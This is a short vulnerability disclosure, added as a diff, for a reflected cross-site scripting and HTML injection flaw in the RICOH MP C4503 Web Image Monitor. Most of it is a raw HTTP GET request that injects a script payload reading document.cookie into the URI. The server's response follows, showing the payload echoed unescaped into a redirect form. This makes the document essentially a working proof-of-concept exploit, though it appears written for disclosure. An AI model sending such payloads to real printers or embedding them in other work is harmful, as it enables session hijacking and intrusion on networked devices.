@@ -1,0 +1,33 @@
+
+Affected Product: RICOH MP C4503 Web Image Monitor
+
+Vulnerability: Cross site scripting (Reflected) & HTML injection
+
+Request made to the http site of the printer and the application makes a redirect to https site, which is injecting the URI value in the response in oder to redirect to the site url.
+
+Request:
+
+GET /web/guest/en/websys/webArch/mainFrame.cgi'/><script>alert(document.cookie)</script><h1>hello</h1><1 HTTP/1.1
+Host: 192.168.10.40
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: risessionid=013659822799472; cookieOnOffChecker=on; wimsesid=--
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 24 Sep 2020 14:28:58 GMT
+Server: Web-Server/3.0
+Content-Type: text/html; charset=UTF-8
+Content-Length: 536
+Expires: Thu, 24 Sep 2020 14:28:58 GMT
+Pragma: no-cache
+Cache-Control: no-cache
+Set-Cookie: cookieOnOffChecker=on; path=/
+Connection: close
+
+<html>  <head>    <meta http-equiv='Cache-Control' content='no-cache'/>    <meta http-equiv='Pragma' content='no-cache'/>    <meta http-equiv='Expires' content='-1'/>    <title>Web Image Monitor</title>  </head>  <body onLoad='document.jump.submit()'>    <form name='jump' action='https://192.168.10.40/web/guest/en/websys/webArch/mainFrame.cgi' method='POST' target='_top'>      <input type='hidden' name='open' value='websys/webArch/mainFrame.cgi'/><script>alert(document.cookie)</script><h1>hello</h1><1'/>    </form>  </body></html>
